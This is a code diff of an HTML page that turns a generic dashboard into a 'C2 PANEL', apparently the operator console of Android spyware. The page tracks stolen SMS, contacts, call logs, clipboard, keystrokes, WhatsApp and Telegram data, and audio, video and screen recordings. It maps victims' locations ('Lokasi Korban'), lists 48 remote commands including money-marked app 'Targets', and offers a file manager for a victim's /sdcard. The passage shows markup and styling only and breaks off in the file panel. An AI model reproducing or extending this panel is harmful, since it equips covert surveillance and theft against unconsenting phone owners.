@@ -3,156 +3,222 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
-    <title>🔬 DASHBOARD ULTIMATE v4.0</title>
-    <!-- Leaflet CSS untuk Map -->
+    <title>☠️ C2 PANEL - ULTIMATE v4.0</title>
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
     <style>
         *{margin:0;padding:0;box-sizing:border-box}
-        body{background:#0a0e17;color:#e0e0e0;font-family:'Segoe UI',Arial,sans-serif;min-height:100vh}
-        .container{max-width:1400px;margin:0 auto;padding:20px}
-        .header{display:flex;justify-content:space-between;align-items:center;padding:15px 20px;background:linear-gradient(135deg,#0d1a2b,#1a2a3f);border-radius:12px;margin-bottom:20px;border:1px solid #2a3f5f}
-        .header h1{font-size:24px;color:#4fc3f7}
-        .header .badge{background:#2a3f5f;padding:5px 15px;border-radius:20px;font-size:12px;color:#4fc3f7}
-        .login-container{max-width:400px;margin:100px auto;background:#0d1a2b;padding:40px;border-radius:12px;border:1px solid #2a3f5f}
-        .login-container h2{color:#4fc3f7;margin-bottom:20px;text-align:center}
-        .login-container input{width:100%;padding:12px;border-radius:8px;border:1px solid #2a3f5f;background:#0a0e17;color:#e0e0e0;margin-bottom:15px}
-        .login-container button{width:100%;padding:12px;border-radius:8px;border:none;background:#1a3a5f;color:#4fc3f7;font-size:16px;cursor:pointer}
-        .login-container button:hover{background:#2a4a6f}
-        .login-error{color:#ff6b6b;text-align:center;margin-top:10px;display:none}
-        .stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:15px;margin-bottom:20px}
-        .stat-card{background:linear-gradient(135deg,#0d1a2b,#1a2a3f);padding:15px;border-radius:10px;border:1px solid #2a3f5f;text-align:center}
-        .stat-card .num{font-size:28px;font-weight:bold;color:#4fc3f7}
-        .stat-card .label{font-size:11px;color:#8899aa;margin-top:5px}
-        .tabs{display:flex;gap:10px;flex-wrap:wrap;margin-bottom:20px}
-        .tab{background:#0d1a2b;padding:10px 20px;border-radius:8px;cursor:pointer;border:1px solid #2a3f5f;color:#8899aa;transition:0.3s;font-size:12px}
-        .tab.active{background:#1a3a5f;border-color:#4fc3f7;color:#4fc3f7}
-        .tab:hover{background:#1a2a3f}
-        .panel{display:none;background:#0d1a2b;border-radius:10px;padding:20px;border:1px solid #2a3f5f}
+        body{background:#0a0e17;color:#c8d6e5;font-family:'JetBrains Mono',monospace;min-height:100vh}
+        ::-webkit-scrollbar{width:6px}
+        ::-webkit-scrollbar-track{background:#0d1a2b}
+        ::-webkit-scrollbar-thumb{background:#1a3a5f;border-radius:3px}
+        ::-webkit-scrollbar-thumb:hover{background:#2a4a6f}
+        .container{max-width:1600px;margin:0 auto;padding:15px}
+        /* HEADER */
+        .header{display:flex;justify-content:space-between;align-items:center;padding:12px 20px;background:linear-gradient(135deg,#0d1a2b,#1a2a3f);border-radius:8px;border:1px solid #1a2a3f;margin-bottom:15px}
+        .header-left{display:flex;align-items:center;gap:15px}
+        .header-left .logo{font-size:18px;font-weight:700;color:#00ff88;letter-spacing:1px}
+        .header-left .logo span{color:#4fc3f7}
+        .header-left .status{display:flex;align-items:center;gap:8px;font-size:12px;color:#8899aa}
+        .header-left .status .dot{width:8px;height:8px;border-radius:50%;background:#00ff88;animation:pulse 1.5s infinite}
+        @keyframes pulse{0%,100%{opacity:1}50%{opacity:0.3}}
+        .header-right{display:flex;align-items:center;gap:15px}
+        .header-right .badge{background:#1a2a3f;padding:4px 12px;border-radius:12px;font-size:11px;color:#4fc3f7;border:1px solid #2a3f5f}
+        .header-right .badge .num{color:#00ff88;font-weight:700}
+        .header-right .logout-btn{background:#3a1a1a;border:1px solid #5f1a1a;color:#ff6b6b;padding:5px 15px;border-radius:6px;cursor:pointer;font-size:12px;font-family:inherit;transition:0.3s}
+        .header-right .logout-btn:hover{background:#5f1a1a}
+        /* STATS */
+        .stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(110px,1fr));gap:8px;margin-bottom:15px}
+        .stat-card{background:#0d1a2b;padding:10px 12px;border-radius:6px;border:1px solid #1a2a3f;text-align:center;transition:0.3s}
+        .stat-card:hover{border-color:#2a4a6f}
+        .stat-card .num{font-size:20px;font-weight:700;color:#00ff88}
+        .stat-card .label{font-size:9px;color:#8899aa;text-transform:uppercase;letter-spacing:0.5px;margin-top:2px}
+        .stat-card .sub{font-size:8px;color:#4a5a6a;margin-top:1px}
+        /* TABS */
+        .tabs{display:flex;gap:4px;flex-wrap:wrap;margin-bottom:15px;background:#0d1a2b;padding:5px;border-radius:8px;border:1px solid #1a2a3f}
+        .tab{background:transparent;padding:8px 18px;border-radius:6px;cursor:pointer;border:none;color:#8899aa;font-size:12px;font-family:inherit;transition:0.3s}
+        .tab:hover{color:#e0e0e0;background:#1a2a3f}
+        .tab.active{background:#1a3a5f;color:#4fc3f7;box-shadow:inset 0 0 10px rgba(79,195,247,0.1)}
+        .tab .icon{margin-right:6px}
+        /* PANELS */
+        .panel{display:none;background:#0d1a2b;border-radius:8px;padding:15px;border:1px solid #1a2a3f}
         .panel.active{display:block}
-        .table-wrap{overflow-x:auto;max-height:500px;overflow-y:auto}
-        table{width:100%;border-collapse:collapse;font-size:13px}
-        th{background:#1a2a3f;padding:10px 12px;text-align:left;color:#4fc3f7;border-bottom:2px solid #2a3f5f;position:sticky;top:0;z-index:10}
-        td{padding:8px 12px;border-bottom:1px solid #1a2a3f;word-break:break-all}
+        /* TABLE */
+        .table-wrap{overflow-x:auto;max-height:520px;overflow-y:auto}
+        table{width:100%;border-collapse:collapse;font-size:12px}
+        th{background:#1a2a3f;padding:8px 10px;text-align:left;color:#4fc3f7;border-bottom:2px solid #2a3f5f;position:sticky;top:0;z-index:10;font-weight:400;font-size:11px;text-transform:uppercase;letter-spacing:0.5px}
+        td{padding:7px 10px;border-bottom:1px solid #0d1a2b;word-break:break-all;font-size:12px}
         tr:hover{background:#0d1a2b}
-        .map-btn{color:#4fc3f7;text-decoration:none;background:#1a3a5f;padding:2px 10px;border-radius:4px;font-size:11px;display:inline-block}
-        .map-btn:hover{background:#2a4a6f}
-        .cmd-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(160px,1fr));gap:8px}
-        .cmd-btn{background:#0d1a2b;padding:8px 12px;border-radius:6px;border:1px solid #2a3f5f;color:#e0e0e0;cursor:pointer;text-align:center;font-size:11px;transition:0.3s}
-        .cmd-btn:hover{background:#1a3a5f;border-color:#4fc3f7}
+        .map-btn{color:#4fc3f7;text-decoration:none;background:#1a3a5f;padding:2px 8px;border-radius:4px;font-size:10px;display:inline-block;border:1px solid transparent;transition:0.3s}
+        .map-btn:hover{background:#2a4a6f;border-color:#4fc3f7}
+        /* CMD GRID */
+        .cmd-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:6px}
+        .cmd-btn{background:#0d1a2b;padding:6px 10px;border-radius:4px;border:1px solid #1a2a3f;color:#c8d6e5;cursor:pointer;text-align:center;font-size:10px;font-family:inherit;transition:0.3s}
+        .cmd-btn:hover{background:#1a3a5f;border-color:#4fc3f7;color:#fff}
         .cmd-btn.danger{border-color:#5f1a1a;color:#ff6b6b}
         .cmd-btn.danger:hover{background:#3a1a1a}
         .cmd-btn.success{border-color:#1a4a2a;color:#4caf50}
         .cmd-btn.success:hover{background:#1a2a1a}
         .cmd-btn.warning{border-color:#5f4a1a;color:#ffd93d}
         .cmd-btn.warning:hover{background:#3a2a1a}
-        .cmd-category{margin-bottom:15px}
-        .cmd-category .cat-title{color:#4fc3f7;font-size:13px;font-weight:bold;margin-bottom:8px;padding:5px 10px;background:#0d1a2b;border-radius:6px;border-left:3px solid #4fc3f7}
-        .input-group{display:flex;gap:10px;margin:10px 0;flex-wrap:wrap}
-        .input-group input,.input-group select{padding:10px 15px;border-radius:8px;border:1px solid #2a3f5f;background:#0d1a2b;color:#e0e0e0;flex:1;min-width:150px}
-        .input-group button{padding:10px 20px;border-radius:8px;border:none;background:#1a3a5f;color:#4fc3f7;cursor:pointer}
-        .input-group button:hover{background:#2a4a6f}
-        .log-area{background:#050a12;border-radius:8px;padding:15px;height:300px;overflow-y:auto;font-family:monospace;font-size:12px;border:1px solid #1a2a3f}
-        .log-entry{padding:3px 0;border-bottom:1px solid #0a1520}
-        .log-entry .time{color:#4fc3f7}
-        .log-entry .type{color:#8899aa}
-        .log-entry .data{color:#e0e0e0}
-        .modal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:1000;justify-content:center;align-items:center}
-        .modal.active{display:flex}
-        .modal-content{background:#0d1a2b;padding:30px;border-radius:12px;max-width:700px;width:90%;border:1px solid #2a3f5f;max-height:80vh;overflow-y:auto}
-        .modal-close{float:right;background:transparent;border:none;color:#8899aa;font-size:24px;cursor:pointer}
-        .modal-close:hover{color:#e0e0e0}
-        .dashboard-content{display:none}
-        .search-box{display:flex;gap:10px;flex-wrap:wrap;margin-bottom:10px}
-        .search-box input{flex:1;padding:8px 12px;border-radius:6px;border:1px solid #2a3f5f;background:#0d1a2b;color:#e0e0e0;min-width:150px}
-        .file-breadcrumb{display:flex;gap:10px;flex-wrap:wrap;margin-bottom:15px;padding:10px;background:#050a12;border-radius:8px;align-items:center;font-size:13px}
+        .cmd-category{margin-bottom:12px}
+        .cmd-category .cat-title{color:#4fc3f7;font-size:11px;font-weight:700;margin-bottom:6px;padding:4px 10px;background:#0d1a2b;border-radius:4px;border-left:3px solid #4fc3f7;display:flex;justify-content:space-between;align-items:center}
+        .cmd-category .cat-title .count{color:#8899aa;font-weight:400;font-size:10px}
+        /* LOGS */
+        .log-area{background:#050a12;border-radius:6px;padding:10px;height:280px;overflow-y:auto;font-family:'JetBrains Mono',monospace;font-size:11px;border:1px solid #1a2a3f}
+        .log-entry{padding:2px 0;border-bottom:1px solid #0a1520;display:flex;gap:10px}
+        .log-entry .time{color:#4fc3f7;min-width:80px}
+        .log-entry .type{color:#8899aa;min-width:60px}
+        .log-entry .data{color:#c8d6e5}
+        .log-entry .data .highlight{color:#00ff88}
+        /* MAP */
+        #map{height:350px;border-radius:6px;border:1px solid #1a2a3f;margin-top:8px}
+        .location-list{max-height:150px;overflow-y:auto;margin-top:10px;display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:4px}
+        .location-item{background:#0d1a2b;padding:6px 10px;border-radius:4px;border:1px solid #1a2a3f;display:flex;justify-content:space-between;align-items:center;font-size:11px;cursor:pointer;transition:0.3s}
+        .location-item:hover{border-color:#2a4a6f}
+        /* MEDIA */
+        .media-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:10px}
+        .media-card{background:#0d1a2b;border-radius:6px;border:1px solid #1a2a3f;overflow:hidden;cursor:pointer;transition:0.3s}
+        .media-card:hover{border-color:#4fc3f7;transform:scale(1.02)}
+        .media-card .preview{width:100%;height:120px;object-fit:cover;background:#050a12;display:flex;justify-content:center;align-items:center;font-size:36px}
+        .media-card .info{padding:6px 8px;font-size:10px;color:#8899aa;display:flex;justify-content:space-between}
+        .media-card .info .sumber{color:#4fc3f7}
+        /* FILES */
+        .file-breadcrumb{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:10px;padding:8px 12px;background:#050a12;border-radius:4px;align-items:center;font-size:12px}
         .file-breadcrumb span{cursor:pointer;color:#4fc3f7}
         .file-breadcrumb span:hover{text-decoration:underline}
-        .file-item{display:flex;justify-content:space-between;align-items:center;padding:8px 12px;border-bottom:1px solid #0d1a2b;cursor:pointer}
+        .file-item{display:flex;justify-content:space-between;align-items:center;padding:6px 10px;border-bottom:1px solid #0d1a2b;cursor:pointer;font-size:12px}
         .file-item:hover{background:#0d1a2b}
-        .file-item .name{color:#e0e0e0;font-size:13px}
-        .file-item .size{color:#8899aa;font-size:11px}
-        .file-item .actions{display:flex;gap:10px}
-        .file-item .actions button{background:transparent;border:none;cursor:pointer;font-size:14px}
+        .file-item .actions{display:flex;gap:8px}
+        .file-item .actions button{background:transparent;border:none;cursor:pointer;font-size:13px;color:#8899aa;transition:0.3s}
+        .file-item .actions button:hover{color:#fff}
         .file-item .actions .download-btn{color:#4fc3f7}
         .file-item .actions .delete-btn{color:#ff6b6b}
-        .media-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:15px}
-        .media-card{background:#0d1a2b;border-radius:10px;border:1px solid #2a3f5f;overflow:hidden;cursor:pointer;transition:0.3s}
-        .media-card:hover{border-color:#4fc3f7;transform:scale(1.02)}
-        .media-card .preview{width:100%;height:150px;object-fit:cover;background:#0a0e17;display:flex;justify-content:center;align-items:center;font-size:48px}
-        .media-card .info{padding:8px 10px;font-size:11px;color:#8899aa}
-        .media-card .info .sumber{color:#4fc3f7}
-        .empty-state{text-align:center;color:#8899aa;padding:40px;grid-column:1/-1}
-        /* MAP */
-        #map{height:400px;border-radius:10px;border:1px solid #2a3f5f;margin-top:10px}
-        .location-badge{background:#1a3a5f;color:#4fc3f7;padding:2px 8px;border-radius:4px;font-size:11px;display:inline-block;margin:2px}
-        @media(max-width:600px){.header{flex-direction:column;gap:10px;text-align:center}.tabs{justify-content:center}.cmd-grid{grid-template-columns:repeat(auto-fill,minmax(140px,1fr)}}
+        /* INPUT */
+        .input-group{display:flex;gap:8px;margin:8px 0;flex-wrap:wrap}
+        .input-group input,.input-group select{padding:8px 12px;border-radius:4px;border:1px solid #1a2a3f;background:#0d1a2b;color:#c8d6e5;font-family:inherit;font-size:12px;flex:1;min-width:120px;outline:none}
+        .input-group input:focus,.input-group select:focus{border-color:#4fc3f7}
+        .input-group button{padding:8px 16px;border-radius:4px;border:none;background:#1a3a5f;color:#4fc3f7;cursor:pointer;font-family:inherit;font-size:12px;transition:0.3s}
+        .input-group button:hover{background:#2a4a6f}
+        .search-box{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:8px}
+        .search-box input{flex:1;padding:6px 12px;border-radius:4px;border:1px solid #1a2a3f;background:#0d1a2b;color:#c8d6e5;font-family:inherit;font-size:12px;min-width:120px;outline:none}
+        .search-box input:focus{border-color:#4fc3f7}
+        .search-box select{padding:6px 10px;border-radius:4px;border:1px solid #1a2a3f;background:#0d1a2b;color:#c8d6e5;font-family:inherit;font-size:12px;outline:none}
+        .search-box select:focus{border-color:#4fc3f7}
+        /* MODAL */
+        .modal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.85);z-index:1000;justify-content:center;align-items:center}
+        .modal.active{display:flex}
+        .modal-content{background:#0d1a2b;padding:25px;border-radius:8px;max-width:650px;width:92%;border:1px solid #2a3f5f;max-height:85vh;overflow-y:auto}
+        .modal-close{float:right;background:transparent;border:none;color:#8899aa;font-size:22px;cursor:pointer;font-family:inherit}
+        .modal-close:hover{color:#fff}
+        .login-container{max-width:380px;margin:80px auto;background:#0d1a2b;padding:35px;border-radius:8px;border:1px solid #2a3f5f}
+        .login-container h2{color:#4fc3f7;margin-bottom:15px;text-align:center;font-weight:400;letter-spacing:1px}
+        .login-container input{width:100%;padding:10px;border-radius:4px;border:1px solid #1a2a3f;background:#0a0e17;color:#c8d6e5;margin-bottom:12px;font-family:inherit;font-size:14px;outline:none}
+        .login-container input:focus{border-color:#4fc3f7}
+        .login-container button{width:100%;padding:10px;border-radius:4px;border:none;background:#1a3a5f;color:#4fc3f7;font-size:14px;cursor:pointer;font-family:inherit;transition:0.3s}
+        .login-container button:hover{background:#2a4a6f}
+        .login-error{color:#ff6b6b;text-align:center;margin-top:8px;display:none;font-size:12px}
+        .empty-state{text-align:center;color:#8899aa;padding:30px;grid-column:1/-1;font-size:13px}
+        .dashboard-content{display:none}
+        .flex-between{display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:8px}
+        .flex-center{display:flex;align-items:center;gap:8px}
+        .gap-4{gap:4px}
+        .mt-8{margin-top:8px}
+        .mb-8{margin-bottom:8px}
+        .text-muted{color:#8899aa;font-size:11px}
+        .text-success{color:#00ff88}
+        .text-danger{color:#ff6b6b}
+        .text-warning{color:#ffd93d}
+        .text-info{color:#4fc3f7}
+        @media(max-width:768px){.header{flex-direction:column;gap:8px;align-items:stretch;text-align:center}.header-right{justify-content:center;flex-wrap:wrap}.stats{grid-template-columns:repeat(3,1fr)}.tabs{justify-content:center}}
+        @media(max-width:480px){.stats{grid-template-columns:repeat(2,1fr)}.cmd-grid{grid-template-columns:1fr 1fr}}
     </style>
 </head>
 <body>
 
 <!-- LOGIN -->
 <div id="loginContainer" class="login-container">
-    <h2>🔐 DASHBOARD LOGIN</h2>
-    <input type="password" id="loginPassword" placeholder="Masukkan password..." onkeydown="if(event.key==='Enter'){login();}">
-    <button onclick="login()">🔓 LOGIN</button>
-    <div id="loginError" class="login-error">❌ Password salah!</div>
+    <h2>☠️ C2 PANEL LOGIN</h2>
+    <input type="password" id="loginPassword" placeholder="Enter password..." onkeydown="if(event.key==='Enter')login()">
+    <button onclick="login()">🔓 ACCESS</button>
+    <div id="loginError" class="login-error">❌ Invalid password</div>
 </div>
 
 <!-- DASHBOARD -->
 <div id="dashboardContent" class="dashboard-content">
     <div class="container">
+        <!-- HEADER -->
         <div class="header">
-            <h1>🔬 DASHBOARD ULTIMATE v4.0</h1>
-            <div>
-                <span class="badge" id="statusBadge">🟢 Online</span>
-                <span class="badge" id="deviceCount">📱 0 Devices</span>
-                <span class="badge" id="cmdCount">⚡ 48 Commands</span>
-                <button onclick="logout()" style="background:#3a1a1a;border:none;color:#ff6b6b;padding:5px 15px;border-radius:8px;cursor:pointer;margin-left:10px">🚪 Logout</button>
+            <div class="header-left">
+                <div class="logo">☠️ C2<span>PANEL</span></div>
+                <div class="status"><span class="dot"></span><span id="statusText">Online</span></div>
+            </div>
+            <div class="header-right">
+                <span class="badge">📱 <span class="num" id="deviceCount">0</span> Devices</span>
+                <span class="badge">⚡ <span class="num" id="cmdCount">48</span> Commands</span>
+                <span class="badge">📊 <span class="num" id="statTotalHeader">0</span> Total</span>
+                <button class="logout-btn" onclick="logout()">🚪 Logout</button>
             </div>
         </div>
 
-        <!-- STATS -->
+        <!-- STATS - LENGKAP 14 CARD -->
         <div class="stats" id="statsContainer">
             <div class="stat-card"><div class="num" id="statTotal">0</div><div class="label">Total Data</div></div>
-            <div class="stat-card"><div class="num" id="statDevices">0</div><div class="label">Device Online</div></div>
+            <div class="stat-card"><div class="num" id="statDevices">0</div><div class="label">Devices</div></div>
             <div class="stat-card"><div class="num" id="statSMS">0</div><div class="label">SMS</div></div>
-            <div class="stat-card"><div class="num" id="statContacts">0</div><div class="label">Kontak</div></div>
-            <div class="stat-card"><div class="num" id="statLocation">0</div><div class="label">Lokasi</div></div>
+            <div class="stat-card"><div class="num" id="statContacts">0</div><div class="label">Contacts</div></div>
+            <div class="stat-card"><div class="num" id="statLocation">0</div><div class="label">Location</div></div>
+            <div class="stat-card"><div class="num" id="statCallLog">0</div><div class="label">Call Log</div></div>
+            <div class="stat-card"><div class="num" id="statClipboard">0</div><div class="label">Clipboard</div></div>
+            <div class="stat-card"><div class="num" id="statScreenshot">0</div><div class="label">Screenshot</div></div>
+            <div class="stat-card"><div class="num" id="statKeylogger">0</div><div class="label">Keylogger</div></div>
+            <div class="stat-card"><div class="num" id="statWhatsApp">0</div><div class="label">WhatsApp</div></div>
+            <div class="stat-card"><div class="num" id="statTelegram">0</div><div class="label">Telegram</div></div>
+            <div class="stat-card"><div class="num" id="statAudio">0</div><div class="label">Audio</div></div>
+            <div class="stat-card"><div class="num" id="statVideo">0</div><div class="label">Video</div></div>
+            <div class="stat-card"><div class="num" id="statScreenRecord">0</div><div class="label">Screen Rec</div></div>
         </div>
 
         <!-- TABS -->
         <div class="tabs">
-            <div class="tab active" onclick="showPanel('data')">📱 Data</div>
-            <div class="tab" onclick="showPanel('map')">🗺️ Map</div>
-            <div class="tab" onclick="showPanel('c2')">⚡ C2 (48)</div>
-            <div class="tab" onclick="showPanel('logs')">📋 Logs</div>
-            <div class="tab" onclick="showPanel('media')">📸 Media</div>
-            <div class="tab" onclick="showPanel('files')">📁 Files</div>
+            <div class="tab active" onclick="showPanel('data')"><span class="icon">📊</span> Data</div>
+            <div class="tab" onclick="showPanel('map')"><span class="icon">🗺️</span> Map</div>
+            <div class="tab" onclick="showPanel('c2')"><span class="icon">⚡</span> C2</div>
+            <div class="tab" onclick="showPanel('logs')"><span class="icon">📋</span> Logs</div>
+            <div class="tab" onclick="showPanel('media')"><span class="icon">📸</span> Media</div>
+            <div class="tab" onclick="showPanel('files')"><span class="icon">📁</span> Files</div>
         </div>
 
         <!-- PANEL DATA -->
         <div class="panel active" id="panelData">
-            <div class="input-group">
-                <input type="text" id="searchInput" placeholder="🔍 Cari data..." oninput="filterData()">
-                <select id="filterType" onchange="filterData()">
-                    <option value="">Semua Tipe</option>
-                    <option value="sms">SMS</option>
-                    <option value="kontak">Kontak</option>
-                    <option value="lokasi">Lokasi</option>
-                    <option value="device">Device</option>
-                    <option value="screenshot">Screenshot</option>
-                    <option value="clipboard">Clipboard</option>
-                    <option value="call_log">Call Log</option>
-                    <option value="keylogger">Keylogger</option>
-                    <option value="whatsapp">WhatsApp</option>
-                    <option value="telegram">Telegram</option>
-                </select>
-                <button onclick="refreshData()">🔄 Refresh</button>
-                <button onclick="exportData()">📤 Export</button>
+            <div class="flex-between mb-8">
+                <div class="search-box" style="flex:1">
+                    <input type="text" id="searchInput" placeholder="🔍 Search data..." oninput="filterData()">
+                    <select id="filterType" onchange="filterData()">
+                        <option value="">All Types</option>
+                        <option value="sms">SMS</option>
+                        <option value="kontak">Contacts</option>
+                        <option value="lokasi">Location</option>
+                        <option value="device">Device</option>
+                        <option value="screenshot">Screenshot</option>
+                        <option value="clipboard">Clipboard</option>
+                        <option value="call_log">Call Log</option>
+                        <option value="keylogger">Keylogger</option>
+                        <option value="whatsapp">WhatsApp</option>
+                        <option value="telegram">Telegram</option>
+                        <option value="audio">Audio</option>
+                        <option value="video">Video</option>
+                        <option value="screen_record">Screen Rec</option>
+                    </select>
+                </div>
+                <div style="display:flex;gap:8px;flex-wrap:wrap">
+                    <button onclick="refreshData()" style="padding:6px 14px;border-radius:4px;border:1px solid #1a2a3f;background:#0d1a2b;color:#c8d6e5;cursor:pointer;font-size:12px;font-family:inherit">🔄 Refresh</button>
+                    <button onclick="exportData()" style="padding:6px 14px;border-radius:4px;border:1px solid #1a2a3f;background:#0d1a2b;color:#c8d6e5;cursor:pointer;font-size:12px;font-family:inherit">📤 Export</button>
+                </div>
             </div>
             <div class="table-wrap">
                 <table>
-                    <thead><tr><th>Waktu</th><th>Sumber</th><th>Data</th><th>Device</th><th>Aksi</th></tr></thead>
+                    <thead><tr><th>Time</th><th>Source</th><th>Data</th><th>Device</th><th>Action</th></tr></thead>
                     <tbody id="dataTableBody"></tbody>
                 </table>
             </div>
@@ -160,68 +226,75 @@
 
         <!-- PANEL MAP -->
         <div class="panel" id="panelMap">
-            <div style="display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;margin-bottom:15px;">
-                <h3 style="color:#4fc3f7;">🗺️ Lokasi Korban</h3>
-                <button onclick="refreshMap()" style="padding:8px 15px;border-radius:6px;border:none;background:#1a3a5f;color:#4fc3f7;cursor:pointer;">🔄 Refresh Map</button>
+            <div class="flex-between mb-8">
+                <span style="color:#4fc3f7;font-size:14px;font-weight:700">🗺️ Location Intelligence</span>
+                <button onclick="refreshMap()" style="padding:6px 14px;border-radius:4px;border:1px solid #1a2a3f;background:#0d1a2b;color:#c8d6e5;cursor:pointer;font-size:12px;font-family:inherit">🔄 Refresh</button>
             </div>
             <div id="map"></div>
-            <div id="locationList" style="margin-top:15px;max-height:200px;overflow-y:auto;"></div>
+            <div class="location-list" id="locationList"></div>
         </div>
 
         <!-- PANEL C2 -->
         <div class="panel" id="panelC2">
+            <div class="flex-between mb-8">
+                <span style="color:#4fc3f7;font-size:14px;font-weight:700">⚡ Command & Control</span>
+                <span class="text-muted">48 commands</span>
+            </div>
             <div class="search-box">
-                <input type="text" id="cmdSearch" placeholder="🔍 Cari command..." oninput="filterCommands()">
+                <input type="text" id="cmdSearch" placeholder="🔍 Search command..." oninput="filterCommands()">
                 <select id="cmdCategoryFilter" onchange="filterCommands()">
-                    <option value="">Semua Kategori (48)</option>
-                    <option value="data">📱 Data Pribadi (10)</option>
-                    <option value="notif">🔔 Notifikasi (4)</option>
+                    <option value="">All Categories</option>
+                    <option value="data">📱 Data (10)</option>
+                    <option value="notif">🔔 Notifications (4)</option>
                     <option value="keylogger">⌨️ Keylogger (4)</option>
-                    <option value="komunikasi">💬 Komunikasi (3)</option>
-                    <option value="apps">📱 Kontrol Aplikasi (5)</option>
-                    <option value="target">💰 Target Aplikasi (7)</option>
+                    <option value="komunikasi">💬 Communication (3)</option>
+                    <option value="apps">📱 Apps (5)</option>
+                    <option value="target">💰 Targets (7)</option>
                     <option value="media">🎥 Media (5)</option>
-                    <option value="screen">📹 Screen Recording (3)</option>
-                    <option value="file">📁 File (2)</option>
-                    <option value="sistem">🔧 Sistem (5)</option>
+                    <option value="screen">📹 Screen Rec (3)</option>
+                    <option value="file">📁 Files (2)</option>
+                    <option value="sistem">🔧 System (5)</option>
                 </select>
             </div>
             <div id="cmdContainer"></div>
-            <div class="input-group" style="margin-top:15px">
-                <input type="text" id="customCmd" placeholder="📝 Custom command..." onkeydown="if(event.key==='Enter'){sendCustomCommand();}">
-                <input type="text" id="customParam" placeholder="📝 Parameter (opsional)" style="flex:0.5;min-width:100px">
-                <button onclick="sendCustomCommand()">📤 Kirim</button>
+            <div class="input-group" style="margin-top:12px">
+                <input type="text" id="customCmd" placeholder="📝 Custom command..." onkeydown="if(event.key==='Enter')sendCustomCommand()">
+                <input type="text" id="customParam" placeholder="📝 Params (optional)" style="flex:0.5;min-width:80px">
+                <button onclick="sendCustomCommand()">📤 Send</button>
             </div>
-            <div id="cmdResult" style="margin-top:10px;padding:10px;background:#050a12;border-radius:8px;font-family:monospace;font-size:12px;display:none;max-height:200px;overflow-y:auto"></div>
+            <div id="cmdResult" style="margin-top:8px;padding:8px 12px;background:#050a12;border-radius:4px;font-size:12px;display:none;max-height:150px;overflow-y:auto;border:1px solid #1a2a3f;font-family:monospace"></div>
         </div>
 
         <!-- PANEL LOGS -->
         <div class="panel" id="panelLogs">
-            <div class="input-group">
-                <input type="text" id="logSearch" placeholder="🔍 Cari log..." oninput="filterLogs()">
-                <button onclick="clearLogs()">🗑️ Clear</button>
+            <div class="flex-between mb-8">
+                <span style="color:#4fc3f7;font-size:14px;font-weight:700">📋 Activity Logs</span>
+                <div style="display:flex;gap:8px">
+                    <input type="text" id="logSearch" placeholder="🔍 Filter logs..." oninput="filterLogs()" style="padding:6px 10px;border-radius:4px;border:1px solid #1a2a3f;background:#0d1a2b;color:#c8d6e5;font-family:inherit;font-size:12px;outline:none;width:200px">
+                    <button onclick="clearLogs()" style="padding:6px 14px;border-radius:4px;border:1px solid #1a2a3f;background:#0d1a2b;color:#c8d6e5;cursor:pointer;font-size:12px;font-family:inherit">🗑️ Clear</button>
+                </div>
             </div>
             <div class="log-area" id="logArea"></div>
         </div>
 
         <!-- PANEL MEDIA -->
         <div class="panel" id="panelMedia">
-            <div style="display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;margin-bottom:15px;">
-                <h3 style="color:#4fc3f7;">📸 Media Preview</h3>
-                <button onclick="renderMedia()" style="padding:8px 15px;border-radius:6px;border:none;background:#1a3a5f;color:#4fc3f7;cursor:pointer;">🔄 Refresh</button>
+            <div class="flex-between mb-8">
+                <span style="color:#4fc3f7;font-size:14px;font-weight:700">📸 Media Gallery</span>
+                <button onclick="renderMedia()" style="padding:6px 14px;border-radius:4px;border:1px solid #1a2a3f;background:#0d1a2b;color:#c8d6e5;cursor:pointer;font-size:12px;font-family:inherit">🔄 Refresh</button>
             </div>
-            <div id="mediaGallery" class="media-grid"></div>
+            <div class="media-grid" id="mediaGallery"></div>
         </div>
 
         <!-- PANEL FILES -->
         <div class="panel" id="panelFiles">
-            <div style="display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;margin-bottom:15px;">
-                <h3 style="color:#4fc3f7;">📁 File Manager</h3>
-                <div style="display:flex;gap:10px;flex-wrap:wrap;">
-                    <button onclick="renderFiles('/sdcard/')" style="padding:6px 12px;border-radius:6px;border:1px solid #2a3f5f;background:#0d1a2b;color:#e0e0e0;cursor:pointer;font-size:12px;">📂 /sdcard</button>
-                    <button onclick="renderFiles('/storage/emulated/0/')" style="padding:6px 12px;border-radius:6px;border:1px solid #2a3f5f;background:#0d1a2b;color:#e0e0e0;cursor:pointer;font-size:12px;">📂 Internal</button>
-                    <button onclick="uploadFile()" style="padding:6px 12px;border-radius:6px;border:none;background:#1a3a5f;color:#4fc3f7;cursor:pointer;font-size:12px;">📤 Upload</button>
-                    <button onclick="renderFiles(currentFilePath)" style="padding:6px 12px;border-radius:6px;border:1px solid #2a3f5f;background:#0d1a2b;color:#4fc3f7;cursor:pointer;font-size:12px;">🔄 Refresh</button>
+            <div class="flex-between mb-8">
+                <span style="color:#4fc3f7;font-size:14px;font-weight:700">📁 File Manager</span>
+                <div style="display:flex;gap:6px;flex-wrap:wrap">
+                    <button onclick="renderFiles('/sdcard/')" style="padding:4px 10px;border-radius:4px;border:1px solid #1a2a3f;background:#0d1a2b;color:#c8d6e5;cursor:pointer;font-size:11px;font-family:inherit">📂 /sdcard</button>
